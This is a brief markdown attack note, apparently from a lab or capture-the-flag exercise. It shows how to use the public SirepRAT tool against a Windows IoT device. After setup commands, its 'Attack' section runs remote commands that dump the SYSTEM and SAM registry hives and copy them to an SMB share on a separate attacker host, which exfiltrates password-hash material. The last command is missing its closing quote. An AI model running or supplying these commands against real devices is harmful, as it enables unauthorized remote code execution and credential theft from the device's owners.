## PoC
`https://github.com/SafeBreach-Labs/SirepRAT`
## Ready
```
git clone https://github.com/SafeBreach-Labs/SirepRAT.git
cd SirepRAT/
pip3 install -r requirements.txt
python3 SirepRAT.py --help
```
## Attack
```
python3 SirepRAT.py 10.10.10.2 GetSystemInformationFromDevice
python3 SirepRAT.py 10.10.10.2 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c reg save HKLM\SYSTEM C:\SYSTEM"
python3 SirepRAT.py 10.10.10.2 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c reg save HKLM\SAM C:\SAM"
python3 SirepRAT.py 10.10.10.2 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c copy C:\SYSTEM \\\\10.10.14.2\\Public\\SYSTEM"
python3 SirepRAT.py 10.10.10.2 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c copy C:\SAM \\\\10.10.14.2\\Public\\SAM
```
